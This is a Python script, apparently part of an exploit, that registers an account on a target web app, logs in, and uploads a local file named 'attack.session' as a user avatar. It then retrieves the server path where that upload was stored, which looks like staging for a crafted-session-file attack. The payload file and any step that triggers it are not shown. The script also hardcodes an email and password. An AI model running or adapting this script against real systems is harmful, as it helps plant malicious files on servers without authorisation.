import requests

email='dxyabc@123.com'
password='dxy0411'

def register(host):
    url = host + '/user'
    headers = {'Content-Type': 'application/json;charset=UTF-8'}
    payload = {'email': email, 'passwd': password, 'passwordAgain': password}
    r = requests.put(url, json=payload, headers=headers)
    if r.status_code != 200:
        print("fail to register")
        exit(-1)
    print("register success")

def login(host):
    url = host + '/login'
    headers = {'Content-Type': 'application/json;charset=UTF-8'}
    payload = {'username': email, 'password': password}
    r = requests.post(url, json=payload, headers=headers)
    if r.status_code != 200 or r.json()['authenticated'] is False:
        print("fail to login")
        exit(-1)
    print("login success")
    return r.cookies['JSESSIONID']


def upload(host,sid):
    url = host + '/user/img'
    cookies = {'JSESSIONID': sid}
    files = {'img': open('./attack.session', 'rb')}
    r = requests.post(url, files=files, cookies=cookies)
    if r.status_code != 200:
        print("fail to upload avatar")
        exit(-1)
    print("upload success")


def queryUploaded(host,sid):
    cookies = {'JSESSIONID': sid}
    # obtain user id
    url_current = host + '/user/current'
    r_current = requests.get(url_current, cookies=cookies)
    if r_current.status_code != 200:
        print("invaild current user")
        exit(-1)
    # obtain user info
    try:
        url_user = '{0}/user/{1}'.format(host, r_current.json()['id'])
    except KeyError:
        print("valid current user but no id returned")
        exit(-1)
    r_user = requests.get(url_user, cookies=cookies)
    if r_user.status_code != 200:
        print("fail to obtain user info")
        exit(-1)
    try:
        return r_user.json()['picture']
    except KeyError:
        print("valid user info but no avatar returned")
        exit(-1)

